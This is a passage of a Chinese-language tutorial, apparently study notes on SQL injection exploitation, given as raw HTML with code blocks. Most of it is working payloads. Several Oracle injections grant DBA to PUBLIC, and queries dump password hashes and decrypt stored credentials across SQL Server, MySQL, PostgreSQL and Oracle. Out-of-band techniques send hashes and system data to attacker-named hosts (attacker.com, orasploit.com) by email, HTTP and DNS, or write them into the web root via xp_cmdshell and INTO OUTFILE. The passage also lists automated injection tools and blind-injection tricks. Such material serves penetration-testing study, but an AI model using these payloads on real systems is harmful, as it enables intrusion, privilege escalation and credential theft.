dbms_sql.execute(''''||D||'''')=1--');SYS.LT.COMPRESSWORKSPACETREE(''''a'''''''' and dbms_sql.execute(''''||D||'''')=1--'''');end;''; commit; end;') from dual) is not null--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="SYS-KUPP-PROC"><a href="#SYS-KUPP-PROC" class="headerlink" title="SYS.KUPP$PROC"></a>SYS.KUPP$PROC</h5><p>SYS.KUPPSPROC.CREATE MASTER PROCESS()函数是另外一个 Oracle 函数，它允许执行任意PL/SQL语句。只有具有DBA角色的用户才能执行该函数。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> dbms_xmlquery<span class="token punctuation">.</span>newcontext<span class="token punctuation">(</span><span class="token string">' declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' begin sys.vulnproc(''''a''''''''||sys.kupp$proc.create_master_process(''''''''EXECUTE IMMEDIATE''''''''''''''''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE''''''''''''''''''''''''''''''''GR ANT DBA TO PUBLIC'''''''''''''''''''''''''''''''';END;'''''''''''''''''''''''''''''''';'''''''')||''''''''a'''');end; ''; commit; end;'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="弱许可权限"><a href="#弱许可权限" class="headerlink" title="弱许可权限"></a>弱许可权限</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">ANY</span> <span class="token keyword">VIEW</span><span class="token keyword">CREATE</span> <span class="token keyword">ANY</span> <span class="token keyword">TRIGGER</span><span class="token keyword">CREATE</span> <span class="token keyword">ANY</span> <span class="token keyword">PROCEDURE</span><span class="token keyword">EXECUTE</span> <span class="token keyword">ANY</span> <span class="token keyword">PROCEDURE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这些权限间接地允许权限提升攻击。</p><p>使用<code>CREATE ANY TRIGGER</code>提升权限</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> dbms_xmlquery<span class="token punctuation">.</span>newcontext<span class="token punctuation">(</span><span class="token string">'declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' create or replace trigger "SYSTEM". the_trigger before insert on system.OL$ for each row declare pragma autonomous_transaction; BEGIN execute immediate ''''GRANT DBA TO PUBLIC''''; END the_trigger;'';end;'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="窃取哈希口令"><a href="#窃取哈希口令" class="headerlink" title="窃取哈希口令"></a>窃取哈希口令</h3><h4 id="SQL-Server-2"><a href="#SQL-Server-2" class="headerlink" title="SQL Server"></a>SQL Server</h4><p>不同版本，差别很大，都需要管理员权限才能访问哈希口令表</p><h5 id="SQL-Server-2000"><a href="#SQL-Server-2000" class="headerlink" title="SQL Server 2000"></a>SQL Server 2000</h5><p>哈希口令储存在master数据库的sysxlogins表中</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name<span class="token punctuation">,</span>password <span class="token keyword">FROM</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysxlogins <span class="token comment">-- 检索</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由pwdencrypt()函数生成，哈希值由头，salt，区分大小写的哈希，不区分大小写的哈希组成</p><h5 id="SQL-Server-2005-2008"><a href="#SQL-Server-2005-2008" class="headerlink" title="SQL Server 2005,2008"></a>SQL Server 2005,2008</h5><p>sysxlogins不存在了，移除了不区分大小写的哈希</p><p>通过查询sql_logins视图检索哈希口令</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> password_hash <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>sql_logins<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用fh_varbintohexstr()函数将哈希值显式地强制转换为十六进制字符串</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp?id=1+union+select+master.dbo.fn_varbintohexstr(password_hash)+from+sys.sql_logins+where+name+=+'sa'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Mysql-1"><a href="#Mysql-1" class="headerlink" title="Mysql"></a>Mysql</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">user</span><span class="token punctuation">,</span>password <span class="token keyword">FROM</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">;</span><span class="token comment">-- 检索哈希口令，哈希口令由password()函数产生，算法随版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="PostgreSQL-2"><a href="#PostgreSQL-2" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><p>如果刚好具有administrative权限，就可以访问pg_shadow表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> usename<span class="token punctuation">,</span> passwd <span class="token keyword">FROM</span> pg_shadow<span class="token keyword">SELECT</span> rolname<span class="token punctuation">,</span> rolpassword <span class="token keyword">FROM</span> pg_authid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">HASH</span> <span class="token operator">=</span> <span class="token string">'md5'</span> <span class="token operator">||</span> MD5<span class="token punctuation">(</span><span class="token string">'foobar'</span><span class="token punctuation">)</span> <span class="token operator">=</span> md53858f62230ac3c915f300c664312c63f<span class="token comment">-- foo是password，bar是username </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="Oracle-2"><a href="#Oracle-2" class="headerlink" title="Oracle"></a>Oracle</h4><p>Oracle在sys.user$表的password列存储数据库账户的哈希口令。dba_users视图指向该表，但从Oracle 11g开始，数据加密标准(Data Encryption Standard, DES)的哈希口令不再出现在 dba_user视图中。sys.user$表包含数据库用户(type#=1)和数据库角色(type#=0)的哈希口令。</p><p>针对Oracle DES用户名口令：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">where</span> <span class="token keyword">type</span><span class="token comment">#&gt;0 andlength(password)=16</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>针对Oracle DES角色口令：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">where</span> <span class="token keyword">type</span><span class="token comment">#=1</span>andlength<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">16</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>针对 Oracle SHA1 口令(11g+)：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Select</span> username<span class="token punctuation">,</span>substr<span class="token punctuation">(</span>spare4<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span> <span class="token keyword">hash</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span>spare4<span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span> salt fromsys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">where</span> <span class="token keyword">type</span><span class="token comment">#&gt;0 and length(spare4)=62;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sysman.mgmt_credentials2表是通常能找到的SYS用户明文口令的示例。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- get the cleartext password of the user MGMT_VIEW (generated by Oracle during the installation time, looks like a hash but is a password) </span><span class="token keyword">select</span> view_username<span class="token punctuation">,</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>view_password<span class="token punctuation">)</span> Password <span class="token keyword">from</span> sysman<span class="token punctuation">.</span>mgmt_view_user_credentials<span class="token punctuation">;</span><span class="token comment">-- get the password of the dbsnmp user, databases listener and OS credentials</span><span class="token keyword">select</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>t1<span class="token punctuation">.</span>credential_value<span class="token punctuation">)</span> sysmanuser<span class="token punctuation">,</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>t2<span class="token punctuation">.</span>credential_value<span class="token punctuation">)</span> Password <span class="token keyword">from</span> sysman<span class="token punctuation">.</span>mgmt_credentials2 t1<span class="token punctuation">,</span> sysman<span class="token punctuation">.</span>mgmt_credentials2 t2 <span class="token keyword">where</span> t1<span class="token punctuation">.</span>credential_guid<span class="token operator">=</span>t2<span class="token punctuation">.</span>credential_guid<span class="token operator">and</span> lower<span class="token punctuation">(</span>t1<span class="token punctuation">.</span>credential_set_column<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'username'</span><span class="token operator">and</span> lower<span class="token punctuation">(</span>t2<span class="token punctuation">.</span>credential_set_column<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'password'</span><span class="token comment">-- get the username and password of the Oracle Knowledgebase Metalink </span><span class="token keyword">select</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>ARU_USERNAME<span class="token punctuation">)</span><span class="token punctuation">,</span>sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>ARU_PASSWORD<span class="token punctuation">)</span> <span class="token keyword">from</span> SYSMAN<span class="token punctuation">.</span>MGMT_ARU_CREDENTIALS<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Oracle组件"><a href="#Oracle组件" class="headerlink" title="Oracle组件"></a>Oracle组件</h5><ul><li>APEX</li><li>Oracle Internet Directory</li></ul><h3 id="带外通信"><a href="#带外通信" class="headerlink" title="带外通信"></a>带外通信</h3><p>用于发送请求的HTTP(S)连接被用于接收响应。不过也有例外的情况：可以通过完全不同的信道来传输结果。我们称这样的通信 为“带外”，或简称为OOB(Out Of Band)。</p><h4 id="e-mail"><a href="#e-mail" class="headerlink" title="e-mail"></a>e-mail</h4><p>攻击者需要做的是构造一种利用，通过它来提取想要的信息，将数据打包到e-mail中并使用专门的数据库函数插入到e-mail队列中。之后该e-mail就会出现在攻击者的邮箱中。</p><h5 id="MS-Server"><a href="#MS-Server" class="headerlink" title="MS Server"></a>MS Server</h5><p>SQL Mail（SQL Server 2000、2005 和 2008）和 Database Mail（SQL Server 2005 和 2008）</p><ul><li><p>SQL Mail</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_startmail<span class="token punctuation">;</span><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_sendmail <span class="token variable">@recipients</span> <span class="token operator">=</span> <span class="token string">'admin@attacker.com'</span><span class="token punctuation">,</span> <span class="token variable">@query</span> <span class="token operator">=</span><span class="token string">'select @@version'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>Database Mail</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--Enable Database Mail</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'Database Mail XPs'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token comment">-- Create a new account, MYACC. The SMTP server is provided in this call. </span><span class="token keyword">EXEC</span> msdb<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysmail_add_account_sp<span class="token variable">@account_name</span><span class="token operator">=</span><span class="token string">'MYACC'</span><span class="token punctuation">,</span><span class="token variable">@email_address</span><span class="token operator">=</span><span class="token string">'hacked@victim.com'</span><span class="token punctuation">,</span><span class="token variable">@display_name</span><span class="token operator">=</span><span class="token string">'mls'</span><span class="token punctuation">,</span><span class="token variable">@mailserver_name</span><span class="token operator">=</span><span class="token string">'smtp.victim.com'</span><span class="token punctuation">,</span><span class="token variable">@account_id</span><span class="token operator">=</span><span class="token boolean">NULL</span><span class="token punctuation">;</span><span class="token comment">-- Create a new profile, MYPROFILE</span><span class="token keyword">EXEC</span> msdb<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysmail_adci_profile_sp<span class="token variable">@profile_name</span><span class="token operator">=</span> <span class="token string">'MYPROFILE'</span><span class="token punctuation">,</span><span class="token variable">@description</span><span class="token operator">=</span><span class="token boolean">NULL</span><span class="token punctuation">,</span> <span class="token variable">@profile_id</span><span class="token operator">=</span><span class="token boolean">NULL</span><span class="token punctuation">;</span><span class="token comment">-- Bind the account to the profile</span><span class="token keyword">EXEC</span> msdb<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysmail_add_profileaccount_sp <span class="token variable">@profile_name</span><span class="token operator">=</span><span class="token string">'MYPROFILE'</span><span class="token punctuation">,</span><span class="token variable">@account_name</span><span class="token operator">=</span><span class="token string">'acc'</span><span class="token punctuation">,</span><span class="token variable">@sequence_number</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">-- Retrieve login</span><span class="token keyword">DECLARE</span> <span class="token variable">@b</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token variable">@b</span><span class="token operator">=</span><span class="token keyword">SYSTEM_USER</span><span class="token punctuation">;</span><span class="token comment">-- Send the mail</span><span class="token keyword">EXEC</span> msdb<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sp_send_dbmail <span class="token variable">@profile_name</span><span class="token operator">=</span><span class="token string">'MYPROFILE'</span><span class="token punctuation">,</span>@recipients<span class="token operator">=</span><span class="token string">'allyrbase@attacker.com'</span><span class="token punctuation">,</span> <span class="token variable">@subject</span><span class="token operator">=</span><span class="token string">' system user'</span><span class="token punctuation">,</span><span class="token variable">@body</span><span class="token operator">=</span><span class="token variable">@b</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h5 id="Oracle-3"><a href="#Oracle-3" class="headerlink" title="Oracle"></a>Oracle</h5><p>UTL_SMTP提供了一系列函数来启动并管理一个SMTP连接：先使 用UTL_SMTP.OPEN_CONNECTION与服务器取得联系，之后使用UTL_SMTP.HELLO向服务器发送“HELLO”消息，接着分别使用UTL_SMTP.MAIL和UTL_SMTP.RCP指定发送者和接收者，接下来使用UTL_SMTP.DATA指定消息，最后使用UTL_SMTP.QUIT终止会话。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">UTL_MAIL<span class="token punctuation">.</span>SEND<span class="token punctuation">(</span>sender<span class="token punctuation">,</span> recipient<span class="token punctuation">,</span> cc<span class="token punctuation">,</span> bcc<span class="token punctuation">,</span> subject<span class="token punctuation">,</span> message<span class="token punctuation">,</span> mime_type<span class="token punctuation">,</span> priority<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="HTTP-DNS"><a href="#HTTP-DNS" class="headerlink" title="HTTP/DNS"></a>HTTP/DNS</h4><p>Oracle 还提供了两种执行 HTTP 请求的方法:UTL_ HTTP 和 HTTPURI TYPEoUTL_ HTTP 包和HTTPURI_TYPE对象类型默认授权给了公共角色，可以由数据库所有用户执行或通过 SQL注入加以执行。</p><p>要想向远程系统发送SYS用户的哈希口令，可注入下列字符串：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">or</span> l<span class="token operator">=</span>utl_http<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">'http://www.orasploit.com/'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">select</span> password <span class="token keyword">from</span> dba_users <span class="token keyword">where</span> rownum<span class="token operator">=</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以借助于HTTPURI_TYPE对象类型，如下所示：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span>HTTPURI_TYPE<span class="token punctuation">(</span><span class="token string">'http://www.orasploit.com/'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">select</span> password <span class="token keyword">from</span> dba_users <span class="token keyword">where</span> rownum<span class="token operator">=</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getclob<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果SQL查询写在URL内部，那么还可以通过域名系统(Domain Name System,DNS)查询来发送数据(最大为64字节)。该查询作用于外部站点</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span> utl_http<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">'http://www.'</span><span class="token operator">||</span><span class="token punctuation">(</span>selectpasswordfromdba_userswhererownum<span class="token operator">=</span>l<span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'.orasploit.com/'</span><span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><p>如果攻击者拥有足够的写文件系统的权限，那么他就可以将查询结果重定向到Web服务器根目录下的一个文件中，之后他便可以使用浏览器来正常访问该文件。</p><h5 id="SQL-Server-3"><a href="#SQL-Server-3" class="headerlink" title="SQL Server"></a>SQL Server</h5><p>检索sql_logins表中第一个用户的用户名和哈希，将该值重定向到文件系统的一个文本文件中</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- Declare needed variables</span><span class="token keyword">DECLARE</span> <span class="token variable">@a</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token variable">@hash</span> nvarchar<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">@fileid</span> <span class="token keyword">int</span><span class="token punctuation">;</span><span class="token comment">-- Take the username and password hash of the first user in sql_logins </span><span class="token comment">-- and store it into the variable @hash</span><span class="token keyword">SELECT</span> <span class="token keyword">top</span> <span class="token number">1</span> <span class="token variable">@hash</span> <span class="token operator">=</span> name <span class="token operator">+</span><span class="token string">'|'</span><span class="token operator">+</span>master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>fn_varbintohexstr<span class="token punctuation">(</span>password_hash<span class="token punctuation">)</span> <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>sql_logins<span class="token punctuation">;</span> <span class="token comment">-- Create a FileSystemObject pointing to the location of the desired file</span><span class="token keyword">EXEC</span> sp_OACreate <span class="token string">'Scripting.FileSystemObject'</span><span class="token punctuation">,</span> <span class="token variable">@a</span> <span class="token keyword">OUT</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_OAMethod <span class="token variable">@a</span><span class="token punctuation">,</span><span class="token string">'OpenTextFile'</span><span class="token punctuation">,</span> <span class="token variable">@fileid</span> <span class="token keyword">OUT</span><span class="token punctuation">,</span> <span class="token string">'c:\inetpub\wwwroot\hash.txt'</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">-- Write the @hash variable into that file</span><span class="token keyword">EXEC</span> sp_OAMethod <span class="token variable">@fileid</span><span class="token punctuation">,</span> <span class="token string">'WriteLine'</span><span class="token punctuation">,</span> <span class="token boolean">Null</span><span class="token punctuation">,</span> <span class="token variable">@hash</span><span class="token punctuation">;</span> <span class="token comment">-- Destroy the objects that are not needed anymore</span><span class="token keyword">EXEC</span> sp_OADestroy <span class="token variable">@fileid</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_OADestroy <span class="token variable">@a</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用自带工具bcp.exe</p><p>检索整张sql_logins表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> xp_cmdshell <span class="token string">'bcp "select * from sys.sql_logins" queryout c:\inetpub\wwwroot\hashes.txt -T -c'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="Mysql-2"><a href="#Mysql-2" class="headerlink" title="Mysql"></a>Mysql</h5><p>为确定用户是否拥有FILE权限，可使用下面两种查询之一进行测试</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> file_priv <span class="token keyword">FROM</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span> <span class="token keyword">WHERE</span> <span class="token keyword">user</span> <span class="token operator">=</span><span class="token string">'username'</span> <span class="token comment">-- MySQL 4/5</span><span class="token keyword">SELECT</span> grantee<span class="token punctuation">,</span>is_grantable <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>user_privileges <span class="token keyword">WHERE</span> privilege_type <span class="token operator">=</span> <span class="token string">'file'</span> <span class="token operator">AND</span> grantee <span class="token operator">=</span><span class="token string">'username'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>假设用户拥有这样的权限，而且知道Web站点的根目录为/webroot/且MySQL用户能够对该目录进行写访问，那么可注入下列查询：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'/webroot/tables.txt'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="Oracle-4"><a href="#Oracle-4" class="headerlink" title="Oracle"></a>Oracle</h5><p>在Oracle中，大多数用于访问文件的方法(UTL_FILE、DBMS_LOB外部表和Java)都需要一个PL/SQL注入漏洞，因而无法被用到SQL注入场景中。</p><h5 id="在移动设备上实施SQL注入"><a href="#在移动设备上实施SQL注入" class="headerlink" title="在移动设备上实施SQL注入"></a>在移动设备上实施SQL注入</h5><p>SQLite</p><p>建立监听通信</p><h3 id="自动利用SQL注入"><a href="#自动利用SQL注入" class="headerlink" title="自动利用SQL注入"></a>自动利用SQL注入</h3><h4 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h4><p><a href="http://sqlmap.sourceforge.net/">http://sqlmap.sourceforge.net</a></p><h4 id="Bobcat"><a href="#Bobcat" class="headerlink" title="Bobcat"></a>Bobcat</h4><p><a href="http://www.northem-monkee.co.uk/projects/bobcat/bobcat.html">www.northem-monkee.co.uk/projects/bobcat/bobcat.html</a></p><h4 id="BSQL"><a href="#BSQL" class="headerlink" title="BSQL"></a>BSQL</h4><p><a href="http://code.google.eom/p/bsqlhacker/">http://code.google.eom/p/bsqlhacker/</a></p><h4 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h4><ul><li><p>FG-Injection Framework (<a href="http://sourceforge.net/projects/injection-fwk/">http://sourceforge.net/projects/injection-fwk/</a>)</p></li><li><p>Havij (<a href="http://itsecteam.com/en/projects/projectl.htm">http://itsecteam.com/en/projects/projectl.htm</a>)</p></li><li><p>Sqllnjector (<a href="http://www.woanware.co.uk/?page_id=19">http://www.woanware.co.uk/?page_id=19</a>)</p></li><li><p>SQLGET (<a href="http://www.infbbytecom.ar/">www.infbbytecom.ar</a>)</p></li><li><p>Sqlsus (<a href="http://sqlsus.sourcefbrge.net/">http://sqlsus.sourcefbrge.net/</a>)</p></li><li><p>Pangolin (<a href="http://www.nosec-inc.com/en/products/pangolin/">http://www.nosec-inc.com/en/products/pangolin/</a>)</p></li><li><p>Absinthe (<a href="http://0x90.org/releases/absinthe/">http://0x90.org/releases/absinthe/</a>)</p></li></ul><h2 id="SQL盲注利用"><a href="#SQL盲注利用" class="headerlink" title="SQL盲注利用"></a>SQL盲注利用</h2><p>在发现一个SQL注入点时，只返回一个简单错误提示，返回的内容并不能完美的达到预期，这时我们能注入不同的内容注入产生不同回应，通过差异判断注入是否成功，这就是SQL盲注，通常是自动化利用</p><h3 id="寻找并确认SQL盲注"><a href="#寻找并确认SQL盲注" class="headerlink" title="寻找并确认SQL盲注"></a>寻找并确认SQL盲注</h3><h4 id="强制产生通用错误"><a href="#强制产生通用错误" class="headerlink" title="强制产生通用错误"></a>强制产生通用错误</h4><p>通常提交单引号时最常见的错误源是受损的SQL查询</p><h4 id="注入带副作用的查询"><a href="#注入带副作用的查询" class="headerlink" title="注入带副作用的查询"></a>注入带副作用的查询</h4><p>注入副作用的查询是为了让攻击者观察到，通常是注入时间延迟</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">waitfor</span> delay <span class="token string">'0:0:5'</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>pg_sleep<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 注入不同的字符串产生不同的输出</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">' and '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">2</span>  <span class="token comment">-- 永假</span><span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span> <span class="token comment">-- 永真</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="拆分与平衡"><a href="#拆分与平衡" class="headerlink" title="拆分与平衡"></a>拆分与平衡</h4><p>分解合法输入的操作称为拆分，平衡则保证最终的查询中不会包含不平衡的结尾单引号。其基本思想是：收集合法的请求参数，之后使用SQL关键字对它们进行修改以保证与原始数据不同， 但当数据库解析它们时，二者的功能是等价的。</p><p>oracle中<code>||</code>连接两个字符串</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadB'</span><span class="token operator">||</span><span class="token string">'ob'</span><span class="token comment">-- 返回结果是相同的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review authors<span class="token operator">=</span><span class="token string">'MadBob'</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review author<span class="token operator">=</span><span class="token string">'Mad'</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">0x42</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'ob'</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review author<span class="token operator">=</span><span class="token string">'Mad'</span><span class="token operator">+</span><span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'ob'</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review author<span class="token operator">=</span><span class="token string">'Mad'</span><span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'ob'</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review author<span class="token operator">=</span><span class="token string">'Mad'</span><span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'Bob'</span><span aria-hidden="true" 